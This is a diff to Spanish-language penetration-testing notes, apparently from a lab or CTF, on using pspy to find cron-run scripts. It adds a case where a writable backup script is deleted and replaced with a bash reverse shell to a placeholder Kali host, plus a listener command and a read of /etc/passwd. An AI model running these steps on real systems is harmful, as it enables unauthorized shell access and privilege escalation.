@@ -42,6 +42,7 @@ PSPY es una herramienta Linux que monitorea procesos en tiempo real sin necesida
 	2026/10/04 23:59:01 CMD: UID=1001  PID=15761  | /bin/sh -c /var/www/scripts/backup.sh 
 
 
+❯ tail /etc/passwd   # Mirar el numero del ID y que usuario es: 
 ❯ id 1002  # Mirar el nombre del usuario (1002 = user2)          <- CASO 1
 ❯ id 1001  # Mirar el nombre del usuario (1002 = plot_admin)     <- CASO 2
 ```
@@ -82,6 +83,30 @@ Paso 4:
 # En Kali levantar el listener para recibir la revershell 
 ❯ penelope -p 4455
 ```
+
+#### CASO 3
+```bash 
+Paso 1:
+# El archivo existe en nuestro /home 
+❯ ls -la /home/layne.stanley/
+	drwxrwxrwx 5 layne.stanley layne.stanley 4096 Sep 15  2025 .
+	drwxr-xr-x 6 root          root          4096 Sep 12  2025 ..
+	-rwxr-xr-x 1 scott.weiland scott.weiland 2937 Sep 12  2025 bankSmarter_backup.sh
+
+Paso 2:
+# Eliminar el script para crear uno nuevo modificado 
+❯ rm bankSmarter_backup.sh
+
+Paso 3:
+❯ echo '#!/bin/bash' > bankSmarter_backup.sh
+❯ echo 'bash -i >& /dev/tcp/IP_Kali/4455 0>&1' >> bankSmarter_backup.sh
+❯ chmod +x bankSmarter_backup.sh
+
+Paso 4:
+# En Kali levantar el listener para recibir la revershell 
+❯ penelope -p 4455
+```
+
 
 ## Procesos actuales 
 
